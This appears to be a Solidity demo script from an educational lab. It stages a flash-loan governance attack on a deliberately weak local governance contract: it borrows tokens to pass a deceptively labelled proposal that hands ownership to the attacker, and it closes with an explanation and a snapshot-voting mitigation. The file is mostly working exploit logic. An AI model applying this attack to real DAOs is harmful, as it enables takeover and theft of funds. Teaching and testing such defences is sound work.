// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./Deploy.s.sol";
import "../src/attackers/Attacker_Governance.sol";

contract DemoGovernanceAttack {
    DeployScript public deploy;
    Attacker_Governance public attacker;
    MaliciousTarget public maliciousTarget;
    
    function run() external {
        address deployer = msg.sender;
        
        // 1. Deploy infrastructure
        deploy = new DeployScript();
        deploy.run();
        
        (
            ,
            ,
            ,
            address govToken,
            ,
            ,
            ,
            ,
            ,
            address flashLender,
            ,
            address governance,
            ,
        ) = deploy.getAddresses();
        
        console("=== GOVERNANCE ATTACK DEMO ===");
        console("");
        
        // 2. Show initial state
        console("Initial State:");
        uint256 attackerTokens = GovToken(govToken).balanceOf(deployer);
        console("  Attacker GOV tokens:", attackerTokens / 1e18);
        console("  Required for quorum: 1,000,000 GOV");
        console("  Attacker has insufficient tokens to pass proposal alone");
        
        // 3. Deploy malicious target
        maliciousTarget = new MaliciousTarget(governance);
        console("");
        console("Malicious target contract deployed");
        
        // 4. Deploy attacker
        attacker = new Attacker_Governance(
            flashLender,
            governance,
            govToken
        );
        
        // Give attacker some GOV tokens for proposing (need 100k)
        GovToken(govToken).transfer(address(attacker), 100000 * 1e18);
        
        console("Attacker deployed with 100,000 GOV (for proposing)");
        
        // 5. Create malicious proposal
        console("");
        console("Step 1: Creating malicious proposal...");
        bytes memory maliciousCall = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(attacker)
        );
        
        try attacker.setupProposal(
            address(maliciousTarget),
            maliciousCall,
            "Transfer ownership to community multisig" // Looks innocent!
        ) returns (uint256 proposalId) {
            console("  Proposal created with ID:", proposalId);
            
            // 6. Execute attack - flash loan and vote
            console("");
            console("Step 2: Flash loaning 2,000,000 GOV tokens to vote...");
            console("  Flash loan GOV tokens");
            console("  Vote YES on proposal with borrowed voting power");
            console("  Repay flash loan in same transaction");
            
            try attacker.attack(2000000 * 1e18, proposalId) {
                console("  Voting successful!");
                
                (uint256 forVotes, uint256 againstVotes) = GovernanceWeak(governance).getProposalVotes(proposalId);
                console("  For votes:", forVotes / 1e18);
                console("  Against votes:", againstVotes / 1e18);
                console("  Proposal passed quorum!");
                
                // 7. Wait for voting period (simulate)
                console("");
                console("Step 3: Waiting for voting period to end...");
                // In real scenario: vm.warp(block.timestamp + 3 days + 1);
                // For demo: assume time passed
                
                // 8. Execute proposal
                console("");
                console("Step 4: Executing malicious proposal...");
                try attacker.executeProposal(proposalId) {
                    console("  Proposal executed!");
                    console("  Malicious target ownership transferred to attacker!");
                    console("");
                    console("=== ATTACK SUCCESSFUL ===");
                    console("Attacker now controls the target contract!");
                    
                } catch Error(string memory reason) {
                    console("Execution failed:", reason);
                }
                
            } catch Error(string memory reason) {
                console("Vote failed:", reason);
            }
            
        } catch Error(string memory reason) {
            console("Proposal creation failed:", reason);
        }
        
        console("");
        console("=== EXPLANATION ===");
        console("This attack exploits governance that checks voting power at vote time.");
        console("Attacker can:");
        console("1. Flash loan massive amount of governance tokens");
        console("2. Vote on malicious proposal");
        console("3. Repay loan in same transaction");
        console("4. Execute proposal after voting period");
        console("");
        console("MITIGATION: Use snapshot-based voting (check power at proposal creation)!");
    }
    
    function console(string memory s) internal pure {}
    function console(string memory s, uint256 a) internal pure {}
    function console(string memory s, string memory s2) internal pure {}
}

